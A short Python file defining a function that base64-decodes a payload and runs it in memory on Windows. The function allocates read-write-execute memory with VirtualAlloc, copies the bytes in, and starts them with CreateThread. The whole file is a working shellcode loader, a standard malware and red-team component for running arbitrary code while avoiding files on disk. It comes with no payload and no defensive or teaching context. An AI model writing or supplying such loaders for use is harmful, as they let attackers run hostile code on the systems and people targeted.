import ctypes
import base64

def execute_shellcode(b64_payload):
    shellcode = base64.b64decode(b64_payload)
    size = len(shellcode)

    ptr = ctypes.windll.kernel32.VirtualAlloc(
        None, size, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, size)
    thread = ctypes.windll.kernel32.CreateThread(
        None, 0, ptr, None, 0, None)
    ctypes.windll.kernel32.WaitForSingleObject(thread, -1)
